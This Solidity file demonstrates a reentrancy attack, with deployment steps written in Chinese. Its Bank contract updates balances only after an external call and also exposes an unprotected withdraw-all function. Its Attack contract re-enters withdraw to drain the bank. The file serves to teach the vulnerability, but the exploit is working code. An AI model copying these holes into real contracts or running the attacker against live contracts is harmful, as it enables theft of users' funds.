// SPDX-License-Identifier: MIT

pragma solidity > 0.7.0 < 0.8.0;

/*
模拟重入攻击：

1、首先部署Bank合约，类似于银行，主要有存款和取款；
2、部署Attack合约，需要Bank合约的地址作参数；
3、部署SendEther合约，主要向Attack合约发送以太币；
4、用地址向Bank合约进行两次转账，每次5个ETH;
5、用地址向Attack合约转账2ETH（借助SendEther合约）；
6、调用Attack合约的despoit方法，向Bank合约存入2个ETH，触发提现，提取B全部的ETH。

*/

contract Bank {
    
    uint256 constant public ethLower = 1 ether;
    
    uint256 constant public ethUpper = 5 ether;
    
    mapping(address => uint256) balances;
    
    event depositEth(address sender,uint256 value);
    
    event withdrawEth(address sender,uint256 value);
    
    // 存以太币
    function depositEther() payable public{
        require(msg.value >= ethLower);
        require(msg.value <= ethUpper);
        balances[msg.sender] += msg.value;
        emit depositEth(msg.sender,msg.value);
    }
    
    // 取以太币
    function withdraw(uint256 amount) public{
        require(balances[msg.sender] >= amount);
        msg.sender.call{value: amount}(""); // 重入攻击
        balances[msg.sender] -= amount;
        emit withdrawEth(msg.sender,amount);
    }
    
    // 全取以太币
    function withdraw() public {
        msg.sender.transfer(address(this).balance);
    }
    
    function getBalance(address addr) public view returns(uint256){
        return balances[addr];
    }
    
    function getTotal() public view returns(uint256){
        return address(this).balance;
    }
}


interface IRC20 {
    function depositEther() external payable;
    function withdraw(uint256 amount) external;
    function getBalance(address addr) external view returns(uint256);
}

// 攻击合约
contract Attack {
    address private addr;
    IRC20 private tract;
    
    event withdrawEth(address sender,uint256 value);
    
    constructor(address _addr){
        tract = IRC20(_addr);
    }

    function getBalance() public view returns(uint){
        return address(this).balance;
    }
     
    function despoit() public payable{
        tract.depositEther{value:2 ether}();
        tract.withdraw(1 ether);
    }
    
    function withdraw() public {
        msg.sender.transfer(address(this).balance);
    }
    
    receive() external payable {
        uint256 amount = tract.getBalance(address(this));
        emit withdrawEth(msg.sender,amount);
        if( amount >= 1 ether ){
            tract.withdraw(1 ether);
        }
    }

    
    fallback() external payable {
        
    }
}

// 发送Ether的方式
contract SendEther {
    // transfer
    // send
    // call
    function call(address payable _to) public payable returns (bytes memory){
        (bool sent, bytes memory data) = _to.call{value:msg.value}("sssss"); // 有返回值
        require(sent, "Failed to send eth");
        return data;
    }
}